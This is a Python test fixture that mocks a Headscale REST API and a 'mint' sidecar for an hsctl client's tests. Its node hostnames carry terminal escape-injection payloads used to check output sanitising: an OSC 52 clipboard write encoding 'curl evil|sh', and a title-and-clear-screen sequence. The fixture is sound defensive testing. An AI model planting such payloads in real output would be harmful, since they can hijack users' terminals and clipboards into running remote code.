"""Minimal stand-in for the Headscale v0.29 REST API, for hsctl tests.

Speaks the same grpc-gateway JSON shapes as the real server (compact JSON,
uint64 ids as strings) and records every request to a JSONL log so tests can
assert on exactly what hsctl sent.
"""
import json
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

GOOD_KEY = "test-api-key-123"
# The Friday mint sidecar (/friday/mesh) has its own scoped token and only
# accepts these lifetimes; anything else is rejected server-side.
MINT_TOKEN = "test-mint-token-456"
MINT_EXP = {"1h", "8h", "24h", "48h", "7d"}
NODES_TEXT = (
    "\x1b[1mID | Hostname | User | IP addresses | Connected\x1b[0m\n"
    '45 | axt1800  | asik | 100.64.0.44  | \x1b[32monline\x1b[0m\n'
    '6  | m4       | asik | 100.64.0.6   | \x1b[32monline\x1b[0m "quoted"\n'
    # A node-reported hostname carrying OSC 52 (clipboard write) + BEL: must
    # never reach the terminal.
    "9  | evil\x1b]52;c;Y3VybCBldmlsfHNo\x07 | asik | 100.64.0.9 | online\n"
    # json.dumps' default ensure_ascii turns this into ü on the wire.
    "12 | müller | asik | 100.64.0.12 | online\n"
)
# Same attack through the API backend's node list.
EVIL_NAME = "evil\x1b]0;pwned\x07\x1b[2J"
USERS = [{"id": "1", "name": "asik"}, {"id": "7", "name": "guest"}]
LOG_PATH = sys.argv[2]
# protojson (which grpc-gateway uses) deliberately randomises whitespace after
# ':' so clients cannot depend on exact bytes. Alternate compact and spaced
# output so a parser that only handles one form fails here, not in production.
_responses = 0


class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):  # noqa: A002 - base class signature
        pass

    def _send(self, code, body):
        global _responses
        _responses += 1
        seps = (",", ":") if _responses % 2 else (", ", ": ")
        raw = json.dumps(body, separators=seps).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def _record(self, body):
        with open(LOG_PATH, "a") as f:
            f.write(json.dumps({
                "method": self.command,
                "path": self.path,
                "auth": self.headers.get("Authorization"),
                "body": body,
            }) + "\n")

    def _handle(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length else b""
        body = json.loads(raw) if raw else {}
        self._record(body or None)

        if self.path.startswith("/friday/mesh/"):
            return self._mint(body)

        if self.headers.get("Authorization") != f"Bearer {GOOD_KEY}":
            return self._send(401, {"code": 16, "message": "Unauthorized"})

        url = urlparse(self.path)
        q = parse_qs(url.query)
        route = (self.command, url.path)

        if route == ("GET", "/api/v1/user"):
            users = USERS
            if "name" in q:
                users = [u for u in USERS if u["name"] == q["name"][0]]
            return self._send(200, {"users": users})
        if route == ("POST", "/api/v1/preauthkey"):
            user = next((u for u in USERS if u["id"] == str(body.get("user"))), None)
            if user is None:
                return self._send(404, {"code": 5, "message": "user not found"})
            return self._send(200, {"preAuthKey": {
                "user": user, "id": "42", "key": "hskey-abcdef0123456789",
                "reusable": bool(body.get("reusable")),
                "ephemeral": bool(body.get("ephemeral")),
                "used": False, "expiration": body.get("expiration"),
                "aclTags": body.get("aclTags") or [],
            }})
        if route == ("GET", "/api/v1/preauthkey"):
            return self._send(200, {"preAuthKeys": [
                {"user": USERS[0], "id": "42", "key": "hskey-abcdef0123456789",
                 "reusable": True, "ephemeral": False, "used": False,
                 "expiration": "2027-01-07T00:00:00Z", "aclTags": []},
            ]})
        if route == ("POST", "/api/v1/preauthkey/expire"):
            return self._send(200, {})
        if route == ("GET", "/api/v1/node"):
            return self._send(200, {"nodes": [
                {"id": "45", "givenName": "axt1800", "user": USERS[0],
                 "ipAddresses": ["100.64.0.44"], "online": True,
                 "approvedRoutes": ["192.168.8.0/24"]},
                {"id": "9", "givenName": EVIL_NAME, "user": USERS[0],
                 "ipAddresses": ["100.64.0.9"], "online": True,
                 "approvedRoutes": []},
                # Offline node with a route: a blank "online" cell must not
                # let the route slide left into that column.
                {"id": "4", "givenName": "nas", "user": USERS[0],
                 "ipAddresses": ["100.64.0.4"], "online": False,
                 "approvedRoutes": ["10.0.0.90/32"]},
            ]})
        return self._send(404, {"code": 5, "message": "Not Found"})

    def _mint(self, body):
        # The real sidecar answers {"ok": false, "error": ...} with plain
        # json.dumps spacing, so always use the spaced form here.
        def reply(code, payload):
            raw = json.dumps(payload).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)

        if self.headers.get("Authorization") != f"Bearer {MINT_TOKEN}":
            return reply(401, {"ok": False, "error": "unauthorized"})
        route = (self.command, self.path)
        if route == ("GET", "/friday/mesh/nodes"):
            return reply(200, {"ok": True, "text": NODES_TEXT})
        if route == ("POST", "/friday/mesh/preauth"):
            exp = body.get("expiration")
            if exp not in MINT_EXP:
                return reply(400, {"ok": False, "error": "bad_expiration"})
            return reply(200, {"ok": True, "key": "hskey-mint-0011223344",
                               "expiration": exp,
                               "reusable": bool(body.get("reusable"))})
        if route == ("POST", "/friday/mesh/register"):
            if not str(body.get("auth_id", "")).startswith("hskey-authreq-"):
                return reply(400, {"ok": False, "error": "bad_auth_id"})
            return reply(200, {"ok": True})
        return reply(404, {"ok": False, "error": "not_found"})

    do_GET = do_POST = do_DELETE = _handle


HTTPServer(("127.0.0.1", int(sys.argv[1])), Handler).serve_forever()
